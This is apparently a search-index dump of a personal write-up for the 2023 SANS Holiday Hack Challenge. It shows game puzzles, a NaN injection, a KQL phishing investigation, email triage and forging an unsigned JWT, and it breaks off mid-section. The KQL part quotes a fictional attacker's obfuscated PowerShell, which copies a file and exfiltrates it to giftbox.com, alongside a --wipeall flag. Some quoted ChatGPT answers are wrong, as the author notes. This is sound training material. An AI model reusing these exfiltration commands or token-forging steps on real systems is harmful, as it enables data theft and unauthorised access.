{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":""},{"location":"#introduction","title":"Introduction","text":"<p>This year, for the first time, I decided to embark on writing a report for the 2023 SANS Holiday Hack Challenge! Shout out to Crahan for making this awesome and intuitive template available to all.</p> <p>A trip to the sunny Geese Islands was just the vacation I needed from the cold winter. The itinerary included a cruise around the 6 Geese Islands with shore excursions aplenty. I've created a journal of the challenges I completed that you can check out in the Objectives section. I'm relatively new to the SANS Holiday Hack lore, but I've included some Easter Eggs I've found along the way.</p> <p>This year included the requirement to a form of AI for at least some of the challenges and Santa gives us a hint with some possibilities.</p> Synthesis is the True Ending <p>From: Santa The AI revolution has begun. Some of the most prominent and useful tools born from the advent of powerful AI include ChatGPT, PlayHT, Midjourney, Dall-E 3, Bing AI, and Bard, and Grok.</p> <p>Throughout this report you will see blocks like the one below that contain my prompts to AI and the responses.</p> See AI Assistance <p>My Prompt: ChatGPT Response:</p> <p>My Geese Islands itinerary was so jammed packed and I had so much fun I didn't get to see everything, but I'm looking forward to a return trip to catch up on what I've missed and finish this report in the future!</p> <p>100-page submission limit</p> <p>Each year there's a huge number of write-ups that need to be reviewed by the Counter Hack team. To find a good middle ground between preventing information overload and creating a write-up that can stand on its own as a learning resource, some parts, like the navigation tip below, are collapsed by default. Skipping over these will not take away from understanding the overall solution, but feel free to expand them to get some additional information.</p> Navigation tip <p>Even with less than 50 pages, there's still quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S, F, or / to open up the search dialog.</p> <p>TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! </p>"},{"location":"#answers","title":"Answers","text":"<p>1. Holiday Hack Orientation - </p> <p>Talk to Jingle Ringford on Christmas Island and get your bearings at Geese Islands.</p> <p>2. Snowball Fight - </p> <p>Visit Christmas Island and talk to Morcel Nougat about this great new game. Team up with another player and show Morcel how to win against Santa!</p> <p>3. Linux 101 - </p> <p>Visit Ginger Breddie in Santa's Shack on Christmas Island to help him with some basic Linux tasks. It's in the southwest corner of Frosty's Beach.</p> <p>4. Reportinator - </p> <p>Noel Boetie used ChatNPT to write a pentest report. Go to Christmas Island and help him clean it up. Finding 1: True Finding 2: True Finding 3: False Finding 4: True Finding 5: True Finding 6: False Finding 7: True Finding 8: True Finding 9: False</p> <p>5. Azure 101 - </p> <p>Help Sparkle Redberry with some Azure command line skills. Find the elf and the terminal on Christmas Island.</p> <p>6. Luggage Lock Decode - </p> <p>Help Garland Candlesticks on the Island of Misfit Toys get back into his luggage by finding the correct position for all four dials</p> <p>7. Linux PrivESC - </p> <p>santa</p> <p>8. Faster Lock Combination - </p> <p>Over on Steampunk Island, Bow Ninecandle is having trouble opening a padlock. Do some research and see if you can help open it!</p> <p>9. Game Cartridges: Vol 1 - </p> <p>santaconfusedgivingplanetsqrcode</p> <p>10. Game Cartridges - Vol 2 - </p> <p>Find the second Gamegosling cartridge and beat the game</p> <p>11. Game Cartridges: Vol 3 - </p> <p>Find the third Gamegosling cartridge and beat the game</p> <p>12. Na'an - </p> <p>Shifty McShuffles is hustling cards on Film Noir Island. Outwit that meddling elf and win!</p> <p>13. KQL Kraken Hunt - </p> <p>Beware the Cube that Wombles</p> <p>14. Phish Detection Agency - </p> <p>Fitzy Shortstack on Film Noir Island needs help battling dastardly phishers. Help sort the good from the bad!</p> <p>15. Hashcat - </p> <p>IluvC4ndyC4nes!</p> <p>16. Elf Hunt - </p> <p>Piney Sappington needs a lesson in JSON web tokens. Hack Elf Hunt and score 75 points.</p> <p>17. Certificate SSHenanigans - </p> <p>Gingerbread</p> <p>18. The Captain's Comms - </p> <p>Frequency: 10426 - GoDate: 1224 - GoTime: 1200</p> <p>19. Active Directory - </p> <p>InstructionsForEnteringSatelliteGroundStation.txt</p> <p>20. Space Island Door Access Speaker - </p> <p>There's a door that needs opening on Space Island! Talk to Jewel Loggins there for more information.</p> <p>21. Camera Access - </p> <p>22. Missile Diversion - </p>"},{"location":"#conclusion","title":"Conclusion","text":"<p>Narrative (so far)</p> <p>Just sit right back and you\u2019ll hear a tale, A tale of a yuletide trip That started from a tropic port, Aboard this tiny ship Santa and his helpful elves To Geese Islands did go Continuing their merry work O'er sand instead of snowa New this year: a shiny tool The elves logged in with glee What makes short work of many tasks? It's ChatNPT. It's ChatNPT From images to APIs This AI made elves glad But motivations were unknown So was it good or bad? Could it be that NPT Was not from off-the-shelf? Though we'll forgive and trust again We'd found a naughty elf This fancy AI tool of ours With all our work remained Not good or bad, our online friend Just did as it was trained Surely someone's taint must be Upon our AI crutch ...</p> <p></p>"},{"location":"easter_eggs/","title":"Easter Eggs","text":""},{"location":"easter_eggs/#six-geese-a-leiing","title":"Six Geese A-Lei'ing","text":"<p>The name of the 2023 Holiday Hack Challenge continues the tradition of inspiration from The Twelve Days of Christmas.</p> <p>The Twelve Days Of Christmas</p> <p>... On the second day of Christmas, my true love sent to me Two turtle doves ... On the third day of Christmas, my true love sent to me Three french hens ... On the forth day of Christmas, my true love sent to me Four calling birds ... On the fifth day of Christmas, my true love sent to me Five golden rings ... One the sixth day of Christmas, my true love sent to me Six geese a-laying ...</p>"},{"location":"easter_eggs/#jason","title":"Jason","text":"<p>I've only heard rumors of the legendary Jason sitings at past Holiday Hack Challenges, so I was excited to get a glimpse of Jason the fish, basking in the sun enjoying a well deserved respite.</p> <p></p>"},{"location":"objectives/o1/","title":"Holiday Hack Orientation","text":"<p>Difficulty:  Direct link: --</p>"},{"location":"objectives/o1/#objective","title":"Objective","text":"<p>Request</p> <p>Talk to Jingle Ringford on Christmas Island and get your bearings at Geese Islands.</p> Jingle Ringford <p>Welcome to the Geese Islands and the 2023 SANS Holiday Hack Challenge! I'm Jingle Ringford, one of Santa's many elves.  Santa asked me to meet you here and give you a short orientation to this festive event. Before you head back to your boat, I'll ask you to accomplish a few simple tasks.</p>"},{"location":"objectives/o1/#solution","title":"Solution","text":"<p>All we need to do to complete this challenge is follow Jingle's instructions. First, we receive our starfish badge.</p> <p>Jingle Ringford</p> <p>First things first, here's your badge! It's that starfish in the middle of your avatar. Great - now you're official! Click on the badge on your avatar. That's where you will see your Objectives, Hints, and Conversations for the Holiday Hack Challenge. We've also got handy links to some awesome talks and more there for you!</p> <p>Jingle Ringford</p> <p>Fantastic! OK, one last thing. Click on the Cranberry Pi Terminal and follow the on-screen instructions.</p> <p>Click on the Cranberry Pi terminal icon. Follow the onscreen instructions by typing answer in the prompt and pressing Enter.</p> <p></p> <p>Talk to Jingle Ringford again to get more information about sailing around the islands. Click the character's avatar until the ellipsis (...) appears, indicating the dialogue has ended.</p> <p>Jingle Ringford</p> <p>Perfect! Your orientation is now complete! Head back to your boat or click on the anchor icon on the left of the screen to set sail for Frosty's Beach where Santa's waiting  for you. I've updated your boat's compass to guide the way. As you sail to each island, talk to the goose of that island to receive a colorful lei festooning the masts on your ship. Safe travels my friend and remember, relax, enjoy the sun, and most importantly, have FUN!</p> <p>Answer</p> <p>Get your badge, bearings, and set sail to the rest of the Geese Islands.</p> <p></p>"},{"location":"objectives/o10/","title":"Game Cartridges: Vol 1","text":"<p>Difficulty:  Direct link: --</p>"},{"location":"objectives/o10/#objective","title":"Objective","text":"<p>Request</p> <p>Find the first Gamegosling cartridge and beat the game</p> Dusty Giftwrap <p>Arrr, matey, shiver me timbers! There be buried treasure herrrrre. Just kidding, I'm not really a pirate, I was just hoping it would make finding the treasure easier. I guess you heard about the fabled buried treasure, too? I didn't expect to see anyone else here. This uncharted islet was hard to find. I bet one of these creepy toys has the treasure, and I'm sure not going anywhere near them! If you find the treasure, come back and show me, and I'll tell you what I was able to research about it. Good luck!</p>"},{"location":"objectives/o10/#hints","title":"Hints","text":"Uncharted <p>From: Rose Mold Not all the areas around Geese Islands have been mapped, and may contain wonderous treasures. Go exploring, hunt for treasure, and find the pirate's booty!</p> Gameboy 1 <p>From: Dusty Giftwrap Objective: Game Cartridges: Vol 1 1) Giving things a little push never hurts. 2) Out of sight but not out of ear-shot 3) You think you fixed the QR code? Did you scan it and see where it leads?</p> Approximate Proximity <p>From: Dusty Giftwrap Objective: Game Cartridges: Vol 1 Listen for the gameboy cartridge detector's proximity sound that activates when near buried treasure. It may be worth checking around the strange toys in the Tarnished Trove.</p>"},{"location":"objectives/o10/#solution","title":"Solution","text":"<p>The first game cartridge can be found at Tarished Trove. Once you obtain the Game Boy Cartridge Detector from XXXX, it can be found in the Items section of your badge. Clicking on <code>Test Detector</code> will play the tones that indicate you are near a game cartridge.</p> <p></p> <p>Once you locate the game cartridge around the toys at Tarished Trove, it will also appear in your Items.</p> <p></p> <p>Clicking on the gray text will open the game. You can start a new game or continue an existing game.</p> <p></p> <p>Based on the hints, the game requires fixing a broken QR code and then scanning the code.</p> Game Dialogue <p>Jared: Elf, have you ever heard of a miner named Tom Liston? Elf: What does he mine? Jared: Crypt-o-coin? Elf: Gasp The long lost lost treasure of the undead toe? Elf: I can't believe it! Elf: I'd love to quest for the treasure but there ain't no way I'll ever find this Tom Lis... Jared: I'm sending you Tom's first, middle and last name. His homa address. His cell number. And the last four of social. ELF'S CELL PHONE CHIMES Elf: Excellent! Never fear Very Senior  Technical Engineer Jared Folkins Elf: I will find this treasure and Liston and I will receive... Jared: Groans Ooooh no.... Elf: Muuuch! T-Wiz: I absolutely know what Elf's about to say! Elf: Gloooooory!</p> Our Elf hero heads off into the game world... <p>Ugh! Why in the world does the game world look so disastrously bad? Grumble When I find the ne'er-do-weller who skimped out on the assets for this game!</p> Elf Meets Dog <p>Kody: Woof Hi, I'm Kody! Can you plz fix this QR Code? The developers cheaped out and now a few sing-song blocks are not in the correct position. If you sing to the blocks that are misplaced, they will sing back! Try singing to the block to the south of my position. Hopefully you can fix the misaligned QR blocks.</p> <p>Press R to sing to the block. A movable block will flash green and the correct location will also flash with a green outline. Walking into the block will move it in the direction you are walking.</p> <p>Theres are 7 blocks that need to be moved into the correct position. Once a block is in the correct place, it will no longer move or sing.</p> <p>Quote</p> <p>Kody: Good job! Now go find and fix the rest of the sing-song blocks!</p> <p>Part of the puzzle is moving the blocks to their positions in the correct order. If you move a block to a dead end or the block is in the way of other blocks, talk to Kody and he will reset the game.</p> Block 1 Block 2 Block 3 Block 4 Block 5 Block 6 <p>The last block is far from it's correct location so we need to move the block as we sing to it until we find its home.</p> Original Location of Block 7 Moving Block 7 Final Location of Block 7 <p></p> <p>Quote</p> <p>Elf: I did it! I fixed the QR code! Wait, what's a QR code?</p> <p>Scanning the QR code takes you to https://8bitelf.com/ revealing the flag:santaconfusedgivingplanetsqrcode</p> <p>Answer</p> <p>santaconfusedgivingplanetsqrcode</p>"},{"location":"objectives/o10/#response","title":"Response","text":"<p>Dusty Giftwrap</p> <p>Whoa, you found it! It's a... video game cartridge? Coooooollll... I mean, arrrrrr.... So, here's what my research uncovered. Not sure what it all means, maybe you can make sense of it.</p>"},{"location":"objectives/o11/","title":"Na'an","text":"<p>Difficulty:  Direct link: --</p>"},{"location":"objectives/o11/#objective","title":"Objective","text":"<p>Request</p> <p>Shifty McShuffles is hustling cards on Film Noir Island. Outwit that meddling elf and win!</p> Shifty McShuffles <p>Hey there, stranger! Fancy a game of cards? Luck's on your side today, I can feel it. Step right up, test your wit! These cards could be your ticket to fortune. Trust me, I've got a good eye for winners, and you've got the look of luck about you. Plus, I'd wager you've never played this game before, as this isn't any ordinary deck of cards. It's made with Python. The name of the game is to bamboozle the dealer. So whad'ya think? Are you clever enough?</p>"},{"location":"objectives/o11/#hints","title":"Hints","text":"Stump the Chump <p>From: Shifty McShuffles Terminal: Na'an Try to outsmart Shifty by sending him an error he may not understand.</p> The Upper Hand <p>From: Shifty McShuffles Terminal: Na'an Shifty said his deck of cards is made with Python. Surely there's a weakness to give you the upper hand in his game.</p>"},{"location":"objectives/o11/#solution","title":"Solution","text":"<p>Something here about the game rules and our objective. The hint \"The Upper Hand\" tells us that we can perform NaN injection to swing the odds in our favor.</p> <p></p> <p>Choosing the numbers 0, 1, 2, 8, 9 always resulted in a tie for me.</p> <p>We are unable to enter a number outside of 0-9 and entering NaN into the default game does not change the result.</p> <p></p> <p>In order to win against our sneaky dealer, we'll need to alter the game. </p> <p>If we inspect the page we can find the game.js script</p> <p></p> <p>I decided to search for the term NaN to see if there were any other references to it already. And behold, beginning on line 423 we see this comment: <pre><code>                        /*try{\n                            text = text.trim()\n                            if ( Boolean( text.match(/^(?:0|1|2|3|4|5|6|7|8|9|nan)$/ig) ) ) {\n                                textObject.text = text\n                                current_card.cardtext.setText( textObject.text )\n                                return\n                            }\n                        } catch(e) {}\n                        ToastMessage.showMessage(text.slice(0, 3)+' is invalid. Must be 0-9.')*/\n</code></pre> Let's uncomment this and see what happens. Since NaN is now a valid option for cards, we'll include that as one of the cards each time.</p> <p></p> <p>Rinse and repeat to win!</p> <p></p> <p>Answer</p> <p>Win the game against Shifty McShuffles.</p>"},{"location":"objectives/o11/#response","title":"Response","text":"<p>Shifty McShuffles</p> <p>Well, you sure are more clever than most of the tourists that show up here. I couldn't swindle ya, but don't go telling everyone how you beat me! An elf's gotta put food on the table somehow, and I'm doing the best I can with what I got.</p>"},{"location":"objectives/o12/","title":"KQL Kraken Hunt","text":"<p>Difficulty:  Direct link: Kusto Detective</p>"},{"location":"objectives/o12/#objective","title":"Objective","text":"<p>Request</p> <p>Use Azure Data Explorer to uncover misdeeds in Santa's IT enterprise. Go to Film Noir Island and talk to Tangle Coalbox for more information.</p> Tangle Coalbox <p>Greetings, rookie. Tangle Coalbox of Kusto Detective Agency here. I've got a network infection case on Film Noir Island that needs your expertise. Seems like someone clicked a phishing link within a client's organization, and trouble's brewing. I'm swamped with cases, so I need an extra pair of hands. You up for the challenge? You'll be utilizing the Azure Data Explorer and those KQL skills of yours to investigate this incident. Before you start, you'll need to create a free cluster. Keep your eyes peeled for suspicious activity, IP addresses, and patterns that'll help us crack this case wide open. Remember, kid, time is of the essence. The sooner we can resolve this issue, the better. If you run into any problems, just give me a holler, I've got your back. Good hunting, and let's bring this cyber criminal to justice. Once you've got the intel we need, report back and we'll plan our next move. Stay sharp, rookie.</p>"},{"location":"objectives/o12/#hints","title":"Hints","text":"Outbound Connections <p>From: Tangle Coalbox Objective: KQL Kraken Hunt Do you need to find something that happened via a process? Pay attention to the ProcessEvents table!</p> KQL Tutorial <p>From: Tangle Coalbox Objective: KQL Kraken Hunt Once you get into the Kusto trainer, click the blue Train me for the case button to get familiar with KQL.</p> File Creation <p>From: Tangle Coalbox Objective: KQL Kraken Hunt Looking for a file that was created on a victim system? Don't forget the FileCreationEvents table.</p>"},{"location":"objectives/o12/#solution","title":"Solution","text":"<p>To get started we need to navigate to the Kusto Detective Agency site and follow the FAQ to create an account, free cluster, and log in to the agency. Following the Hint \"KQL Tutorial\", we can click on the Train me for the case button to learn more about KQL.</p> <p>Below each Case summary I've included a screenshot of the queries I used to answer the questions for that case.</p> <p>Onboarding</p> <p>How many Craftperson Elf's are working from laptops? 25</p> <p> </p> <p>Case 1</p> <p>What is the email address of the employee who received this phishing email? alabaster_snowball@santaworkshopgeeseislands.org  What is the email address that was used to send this spear phishing email? cwombley@gmail.com What was the subject line used in the spear phishing email? [EXTERNAL] Invoice foir reindeer food past due</p> <p> </p> <p>Case 2</p> <p>Nicely done! You found evidence of the spear phishing email targeting someone in our organization. Now, we need to learn more about who the victim is! If the victim is someone important, our organization could be doomed! Hurry up, let's find out more about who was impacted! What is the role of our victim in the organization? Head Elf  What is the hostname of the victim's machine? Y1US-DESKTOP  What is the source IP linked to the victim? 10.10.0.4</p> <p> </p> <p>Case 3</p> <p>The victim is Alabaster Snowball? Oh no... that's not good at all! Can you try to find what else the attackers might have done after they sent Alabaster the phishing email? Use our various security log datasources to uncover more details about what happened to Alabaster. What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs! 2023-12-02T10:12:42Z What file is dropped to Alabaster's machine shortly after he downloads the malicious file? giftwrap.exe</p> <p> </p> <p>Case 4</p> <p>Well, that's not good. It looks like Alabaster clicked on the link and downloaded a suspicious file. I don't know exactly what giftwrap.exe does, but it seems bad. Can you take a closer look at endpoint data from Alabaster's machine? We need to figure out exactly what happened here. Word of this hack is starting to spread to the other elves, so work quickly and quietly! The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to? 113.37.9.17:22 What is the timestamp when the attackers enumerated network shares on the machine? 2023-12-02T16:51:44Z What was the hostname of the system the attacker moved laterally to? NorthPolefileshare</p> <p> </p> <p>Case 5</p> <p>Wow, you're unstoppable! Great work finding the malicious activity on Alabaster's machine. I've been looking a bit myself and... I'm stuck. The messages seem to be garbled. Do you think you can try to decode them and find out what's happening? Look around for encoded commands. Use your skills to decode them and find the true meaning of the attacker's intent! Some of these might be extra tricky and require extra steps to fully decode! Good luck! If you need some extra help with base64 encoding and decoding, click on the 'Train me for this case' button at the top-right of your screen. When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine? 2023-12-24T16:07:47Z What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding) NaughtyNiceList.txt The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to? giftbox.com</p> <p>I used ChatGPT to assist with several parts of Case 5. I attempted to have it reverse the file name from question 2, but as you can see below, ChatGPT struggled and in fact, never did provide the correct answer with any of my prompts. </p> See AI Assistance <p>My Prompt: can you mirror image this text? ( 'txt.tsiLeciNythguaN\\potkseD:C txt.tsiLeciNythguaN\\lacitirCnoissiM\\$c\\erahselifeloPhtroN\\ metI-ypoC c- exe.llehsrewop' -split '' | %{$_[0]}) -join ''  ChatGPT Response: Certainly! Here's the mirrored text: <pre><code>powerShell.exe -C \\$MissionControl\\NotherLife\\Placeholders\\c$\\$MissionControl\\NotherLife\\Placeholders\\NaguthciNyceleStxt.C\\$MissionControl\\NotherLife\\Placeholders\\NaguthciNyceleStxt.C\\:DokstepN\\NaguthciNyceleStxt.C\\:DokstepN\n</code></pre> Not quite right...I tried several iterations of this type of prompt, but ChatGPT continued to get confused and not provide the correct answer.</p> <p>ChatGPT did give me a breakthrough for question 3. I spent a lot of time attempting to decode the decimal number array on my own, but a few well-formatted prompts to ChatGPT provided the info I was looking for - that the numbers were Unicode characters. Everything fell into place quickly after that realization. </p> See AI Assistance <p>My Prompt: what does this text mean? <pre><code>[StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120,\n102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105,\n115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))|&amp; ((gv\n'*MDr*').NamE[3,11,2]-joiN\n</code></pre> ChatGPT Response: The provided text is a PowerShell command that decodes a list of numeric values into a string and then joins the characters. Here's a breakdown of the command: <pre><code>[StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120,\n102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105,\n115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))|&amp; ((gv\n'*MDr*').NamE[3,11,2]-joiN\n</code></pre> Breaking it down: 1. <code>[ChaR[]](...)</code>: This part creates an array of characters using the numeric values provided. 2. <code>[StRiNg]::JoIn( '', ...):</code> Joins the characters from the array into a single string with an empty separator. 3. <code>|&amp; ((gv '*MDr*').NamE[3,11,2]-joiN</code>: This part uses the |&amp; operator to pass the result of the previous command as an argument to another command. It retrieves a specific method from the property named 'Name' of an object obtained using the wildcard pattern 'MDr' (presumably a variable or object in the PowerShell environment) and then calls the -joiN method, which is essentially an alias for the Join-Path cmdlet. The specific indices [3, 11, 2] are used to select particular characters from the 'Name' property. To fully understand the command, you would need to know the content of the variable or object represented by 'MDr' and the purpose of extracting specific characters from its 'Name' property. Without this context, the command's exact functionality may not be clear. My Prompt:what does this mean? <pre><code>( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108,\n32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46,\n100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))\n</code></pre> ChatGPT Response:This PowerShell code appears to create an array of characters using the [char[]] syntax and a list of numeric values, and then joins these characters into a single string using an empty separator. Let's break it down: <pre><code>('', [char[]](100, 111, 119, ... 101)) \n</code></pre> 1. <code>''</code>: An empty string. 2. <code>[char[]](...)</code>: Creates an array of characters using the provided numeric values. Each numeric value corresponds to a Unicode character. The numeric values in the list seem to represent ASCII or Unicode values for characters, forming a sequence of characters that make up a file path or command. The entire expression (<code>'', [char[]](...)</code> ) creates an array containing an empty string and another array of characters. My Prompt: translate the following array of decimal unicode characters to their ascii character 100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101  ChatGPT Response: Certainly! Let's translate the array of decimal Unicode values to their corresponding ASCII characters: <pre><code>$unicodeArray = 100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, \n32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46,\n100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101\n\n# Convert each Unicode value to its corresponding ASCII character\n$asciiArray = $unicodeArray | ForEach-Object { [char]$_ }\n\n# Join the characters into a single string\n$asciiString = -join $asciiArray\n\n# Display the resulting string\n$asciiString\n</code></pre> The resulting string is: <pre><code>downwithsanta.exe - exfil C:\\Desktop\\\\NaughtNiceList.docx \\\\giftbox.com\\file\n</code></pre></p> <p> </p> <p>Case 6</p> <p>Wow! You decoded those secret messages with easy! You're a rockstar. It seems like we're getting near the end of this investigation, but we need your help with one more thing... We know that the attackers stole Santa's naughty or nice list. What else happened? Can you find the final malicious command the attacker ran? What is the name of the executable the attackers used in the final malicious command? downwithsanta.exe What was the command line flag used alongside this executable? --wipeall</p> <p> </p> <p>Congratulations!</p> <p>Congratulations, you've cracked the Kusto detective agency section of the Holiday Hack Challenge! By now, you've likely pieced together the broader narrative of the alert we received. It all started with Wombley Cube, a skilled Craftsperson, and a malicious insider, who sent an email to the esteemed head elf, Alabaster Snowball. This seemingly innocent email contained a dangerous link leading to the malicious domain, MadElvesNorthPole.org. Alabaster Snowball, from his PC, unwittingly clicked on the link, resulting in the download and execution of malicious payloads. Notably, you've also discerned Wombley Cube's ulterior motive: to pilfer a copy of Santa's naughty or nice list and erase the data on the share drive containing critical information to Santa's operations. Kudos to you! To earn credit for your fantastic work, return to the Holiday Hack Challenge and enter the secret phrase which is the result of running this query: <pre><code>print base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')\n</code></pre></p> <p>Answer</p> <p>Beware the Cube that Wombles</p>"},{"location":"objectives/o12/#response","title":"Response","text":"<p>Insert Elf Name</p> <p>I had my doubts, but you've proven your worth. That phishing scheme won't trouble our client's organization anymore, thanks to your keen eye and investigatory prowess. So long, Gumshoe, and be careful out there.</p>"},{"location":"objectives/o13/","title":"Phish Detection Agency","text":"<p>Difficulty:  Direct link: --</p>"},{"location":"objectives/o13/#objective","title":"Objective","text":"<p>Request</p> <p>Fitzy Shortstack on Film Noir Island needs help battling dastardly phishers. Help sort the good from the bad!</p> Fitzy Shortstack <p>Just my luck, I thought... A cybersecurity incident right in the middle of this stakeout. Seems we have a flood of unusual emails coming in through ChatNPT. Got a nagging suspicion it isn't catching all the fishy ones. You're our phishing specialist right? Could use your expertise in looking through the output of ChatNPT. Not suggesting a full-blown forensic analysis, just mark the ones screaming digital fraud. We're looking at all this raw data, but sometimes, it takes a keen human eye to separate the chaff, doesn't it? I need to get more powdered sugar for my donuts, so do ping me when you have something concrete on this.</p>"},{"location":"objectives/o13/#hints","title":"Hints","text":"DMARC, DKIM, and SPF, oh my! <p>From: Fitzy Shortstack Terminal: Phish Detection Discover the essentials of email security with DMARC, DKIM, and SPF at Cloudflare's Guide.</p>"},{"location":"objectives/o13/#solution","title":"Solution","text":"<p>Using our investigative skills and our knowledge of email security that we learned from the Cloudflare Guide in the hint, we need to review the emails in the Inbox and the Phishing tabs and then choose Mark as Phishing or Mark as Safe.</p> <p></p> <p>It is important to not only look at the Email Header content, but also the Email Details. After reviewing the DNS tab, we know that a safe email should have an SPF domain of: <code>geeseislands.com</code> and a valid and unaltered DKIM signature. We also want to keep in mind that ChatNPT probably marked some DMARC values incorrectly, so we can't only rely on the DMARC Pass or Fail values.</p> <p></p> <p>As we view each email, we see entries like the one below. Even though the DMARC status is Pass, the Sender email address is not consistent with the Return-Path in the Email headers. This entry should be marked as Phishing.</p> <p></p> <p>We continue reviewing all emails until we have correctly categorized all entries. The table below contains the Phishing emails. All other emails in the challenge not listed below are Safe.</p> Sender Subject Status laura.green@geeseislands.com Security Protocol Briefing Phishing michael.roberts@geeseislands.com Compliance Training Schedule Announcement Phishing nancy@geeseislands.com Public Relations Strategy Meet Phishing oliver.thomas@geeseislands.com New Research Project Kickoff Phishing quincy.adams@geeseislands.com Networking Event Success Strategies Phishing rachel.brown@geeseislands.com Customer Feedback Analysis Meeting Phishing steven.gray@geeseislands.com Procurement Process Improvements Phishing ursula.morris@geeseislands.com Legal Team Expansion Strategy Phishing victor.davis@geeseislands.com Invitation to Research Grant Meeting Phishing xavier.jones@geeseislands.com Urgent IT Security Update Phishing <p></p> <p>Answer</p> <p>There are 10 phishing emails.</p>"},{"location":"objectives/o13/#response","title":"Response","text":"<p>Fitzy Shortstack</p> <p>You've cracked the case! Once again, you've proven yourself to be an invaluable asset in our fight against these digital foes.</p>"},{"location":"objectives/o14/","title":"Elf Hunt","text":"<p>Difficulty:  Direct link: --</p>"},{"location":"objectives/o14/#objective","title":"Objective","text":"<p>Request</p> <p>Piney Sappington needs a lesson in JSON web tokens. Hack Elf Hunt and score 75 points.</p> Piney Sappington <p>Hey there, friend! Piney Sappington here. You look like someone who's good with puzzles and games. I could really use your help with this Elf Hunt game I'm stuck on. I think it has something to do with manipulating JWTs, but I'm a bit lost. If you help me out, I might share some juicy secrets I've discovered. Let's just say things around here haven't been exactly... normal. So, what do ya say? Are you in? Oh, brilliant! I just know we'll crack this game together. I can't wait to see what we uncover, and remember, mum's the word! Thanks a bunch! Keep your eyes open and your ears to the ground.</p>"},{"location":"objectives/o14/#hints","title":"Hints","text":"JWT Secrets Revealed <p>From: Piney Sappington Terminal: Elf Hunt Unlock the mysteries of JWTs with insights from PortSwigger's JWT Guide.</p>"},{"location":"objectives/o14/#solution","title":"Solution","text":"<p>The hint we received from Piney about JWTs is all we need to solve this challenge This knowledge will also come in handy for other challenges. Starting the game, we see that these elves are moving very fast and it is difficult to target them. We also see a Hint button in the bottom left:</p> <p></p> <p>We need to slow the elves down. Let's inspect the page and see if we see anything that could help us. First thing we find is a script in the iframe element that reveals the speed is related to the JWT: <code>speed=sessionJWT.speed</code>. Let's see if we can capture the JWT. I've used Firefox Developer Tools for this challenge.</p> <p></p> <p>Perfect. We see the cookie value: <code>ElfHunt_JWT=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6LTUwMH0.</code> We can easily decode this in CyberChef or at jwt.io:</p> <p><pre><code>{\"alg\":\"none\",\"typ\":\"JWT\"}\n{\"speed\":-500}\n</code></pre> We've confirmed the JWT controls the speed of the elves and it is currently -500. Let's generate a new JWT with a different speed: <pre><code>{\"speed\":-50}\nBase64 Encoded: eyJzcGVlZCI6LTUwfQ\nNew JWT:\nElfHunt_JWT=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6LTUwfQ.\n</code></pre> Let's edit the cookie value to be our crafted JWT and restart the game.</p> <p></p> <p>Now the elves move much slower and we can easily target and hit them until our score reaches 75. </p> <p></p> <p>Answer</p> <p>Get a score of 75 to win the game.</p>"},{"location":"objectives/o14/#response","title":"Response","text":"<p>Piney Sappington</p> <p>Well done! You've brilliantly won Elf Hunt! I couldn't be more thrilled. Keep up the fine work, my friend! What have you found there? The Captain's Journal?  Yeah, he comes around a lot. You can find his comms office over at Brass Buoy Port on Steampunk Island.</p>"},{"location":"objectives/o15/","title":"Certificate SSHenanigans","text":"<p>Difficulty:  Direct link: Request SSH Certificate</p>"},{"location":"objectives/o15/#objective","title":"Objective","text":"<p>Request</p> <p>Go to Pixel Island and review Alabaster Snowball's new SSH certificate configuration and Azure Function App. What type of cookie cache is Alabaster planning to implement?</p> Alabaster Snowball <p>Hello there! Alabaster Snowball at your service. I could use your help with my fancy new Azure server at 